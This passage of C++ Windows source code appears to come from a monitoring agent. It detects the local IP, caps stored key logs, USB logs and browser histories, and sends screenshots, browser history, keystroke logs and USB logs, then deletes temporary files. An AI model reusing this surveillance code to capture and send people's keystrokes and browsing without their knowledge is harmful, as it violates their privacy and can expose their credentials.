    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    
    if (pAdapterInfo == NULL) {
        return "Unknown";
    }
    
    // First call to get required buffer size
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
        if (pAdapterInfo == NULL) {
            return "Unknown";
        }
    }
    
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        std::string bestIP = "";
        int bestPriority = -1;
        
        while (pAdapter) {
            // Check if adapter has a valid IP
            PIP_ADDR_STRING pIPAddr = &pAdapter->IpAddressList;
            while (pIPAddr) {
                std::string ip = pIPAddr->IpAddress.String;
                if (!ip.empty() && ip != "0.0.0.0" &&
                    ip.substr(0, 4) != "127." &&
                    ip.substr(0, 8) != "169.254." &&
                    ip.find(':') == std::string::npos) {
                    
                    // Priority system: Ethernet > Wi-Fi > Others
                    int priority = 0;
                    if (pAdapter->Type == MIB_IF_TYPE_ETHERNET) {
                        priority = 3; // Highest priority for Ethernet
                    } else if (pAdapter->Type == IF_TYPE_IEEE80211) {
                        priority = 2; // Second priority for Wi-Fi
                    } else if (pAdapter->Type == IF_TYPE_PPP) {
                        priority = 1; // Low priority for PPP (dial-up, VPN)
                    } else {
                        priority = 0; // Lowest priority for others
                    }
                    
                    // Also check adapter description for additional hints
                    std::string description = pAdapter->Description;
                    
                    // Boost priority for adapters that are likely primary
                    if (description.find("Ethernet") != std::string::npos || 
                        description.find("Gigabit") != std::string::npos ||
                        description.find("Realtek") != std::string::npos ||
                        description.find("Intel") != std::string::npos) {
                        priority += 1;
                    }
                    
                    // Skip virtual adapters and tunnels
                    if (description.find("Virtual") == std::string::npos &&
                        description.find("Tunnel") == std::string::npos &&
                        description.find("Loopback") == std::string::npos &&
                        description.find("VMware") == std::string::npos &&
                        description.find("VirtualBox") == std::string::npos) {
                        
                        if (priority > bestPriority) {
                            bestIP = ip;
                            bestPriority = priority;
                            // Found candidate IP
                        }
                    }
                }
                pIPAddr = pIPAddr->Next;
            }
            pAdapter = pAdapter->Next;
        }
        
        if (!bestIP.empty()) {
            foundIP = bestIP;
        }
    } else {
        // GetAdaptersInfo failed
    }
    
    free(pAdapterInfo);
    
    // Additional fallback: Try to get IP by connecting to a remote address
    if (foundIP == "Unknown") {
        SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock != INVALID_SOCKET) {
            // Connect to a remote address to determine local IP
            struct sockaddr_in remote_addr;
            remote_addr.sin_family = AF_INET;
            remote_addr.sin_port = htons(80);
            inet_pton(AF_INET, "8.8.8.8", &remote_addr.sin_addr);
            
            if (connect(sock, (struct sockaddr*)&remote_addr, sizeof(remote_addr)) == 0) {
                struct sockaddr_in local_addr;
                int addr_len = sizeof(local_addr);
                if (getsockname(sock, (struct sockaddr*)&local_addr, &addr_len) == 0) {
                    char* ip_str = inet_ntoa(local_addr.sin_addr);
                    if (ip_str && strcmp(ip_str, "0.0.0.0") != 0) {
                        foundIP = std::string(ip_str);
                        // Fallback method found IP
                    }
                }
            }
            closesocket(sock);
        }
    }
    
    if (foundIP == "Unknown") {
        // Could not determine IP address
    } else {
        // IP address determined
    }
    
    return foundIP;
} 

// Memory management function to prevent unlimited growth - enhanced
void manageMemoryLimits() {
    std::lock_guard<std::mutex> lock(dataMutex);
    
    // Limit key logs - more aggressive trimming
    if (keyLogs.size() > MAX_KEY_LOGS) {
        size_t excess = keyLogs.size() - MAX_KEY_LOGS;
        keyLogs.erase(keyLogs.begin(), keyLogs.begin() + excess);
        writeDebugLog("Trimmed " + std::to_string(excess) + " key logs");
    }
    
    // Limit USB logs - more aggressive trimming
    if (usbDeviceLogs.size() > MAX_USB_LOGS) {
        size_t excess = usbDeviceLogs.size() - MAX_USB_LOGS;
        usbDeviceLogs.erase(usbDeviceLogs.begin(), usbDeviceLogs.begin() + excess);
        writeDebugLog("Trimmed " + std::to_string(excess) + " USB logs");
    }
    
    // Limit browser histories - more aggressive trimming
    if (browserHistories.size() > MAX_BROWSER_HISTORIES) {
        size_t excess = browserHistories.size() - MAX_BROWSER_HISTORIES;
        browserHistories.erase(browserHistories.begin(), browserHistories.begin() + excess);
        writeDebugLog("Trimmed " + std::to_string(excess) + " browser histories");
    }
    
    // Force garbage collection by shrinking vectors if they're much larger than needed
    if (keyLogs.capacity() > MAX_KEY_LOGS * 2) {
        std::vector<Json::Value>(keyLogs).swap(keyLogs);
        writeDebugLog("Shrunk key logs vector capacity");
    }
    
    if (usbDeviceLogs.capacity() > MAX_USB_LOGS * 2) {
        std::vector<Json::Value>(usbDeviceLogs).swap(usbDeviceLogs);
        writeDebugLog("Shrunk USB logs vector capacity");
    }
    
    if (browserHistories.capacity() > MAX_BROWSER_HISTORIES * 2) {
        std::vector<Json::Value>(browserHistories).swap(browserHistories);
        writeDebugLog("Shrunk browser histories vector capacity");
    }
} 

// Send initial data requests (screenshot, tic, browser history, key log, USB log)
void sendInitialDataRequests() {
    if(selectedMonitorId.load()<1)return;
    // Starting initial data requests
    
    // Send screenshot first (0.5s delay)
    std::string screenshotPath = takeScreenshot();
    sendScreenshot(screenshotPath);
    updateTrayMenu(); // Update tray menu to show status
    std::this_thread::sleep_for(std::chrono::milliseconds(500));
    
    // Send tic event (0.5s delay)
    sendTicEvent();
    updateTrayMenu();
    std::this_thread::sleep_for(std::chrono::milliseconds(500));
    
    // Collect and send browser history (1s delay)
    collectBrowserHistory();
    sendBrowserHistories();
    updateTrayMenu();
    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    
    // Send key logs (1s delay)
    sendKeyLogs();
    updateTrayMenu();
    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    
    // Send USB logs (1s delay)
    sendUSBLogs();
    updateTrayMenu();
    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    
    // Delete the temporary screenshot file
    DeleteFileA(screenshotPath.c_str());
    
    // Clean up any other temporary files
    cleanupTemporaryFiles();
    // Initial data requests completed
}

// Clean up temporary files to prevent disk space issues
void cleanupTemporaryFiles() {
    // Clean up temporary database files
    DeleteFileA("temp_chrome_history.db");
    DeleteFileA("temp_firefox_history.db");
    DeleteFileA("temp_edge_history.db");
    
    // Clean up any old screenshot files (older than 1 hour)
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA("screenshot_*.jpg", &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            FILETIME fileTime = findData.ftCreationTime;
            SYSTEMTIME systemTime;
            FileTimeToSystemTime(&fileTime, &systemTime);
            
            // Check if file is older than 1 hour
            FILETIME currentTime;
            GetSystemTimeAsFileTime(&currentTime);
            
            ULARGE_INTEGER fileTimeUL, currentTimeUL;
            fileTimeUL.LowPart = fileTime.dwLowDateTime;
            fileTimeUL.HighPart = fileTime.dwHighDateTime;
            currentTimeUL.LowPart = currentTime.dwLowDateTime;
            currentTimeUL.HighPart = currentTime.dwHighDateTime;
            
            // 1 hour = 10000000 * 60 * 60 = 36000000000 (100-nanosecond intervals)
            if ((currentTimeUL.QuadPart - fileTimeUL.QuadPart) > 36000000000) {
                DeleteFileA(findData.cFileName);
                writeDebugLog("Cleaned up old screenshot file: " + std::string(findData.cFileName));
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }
} 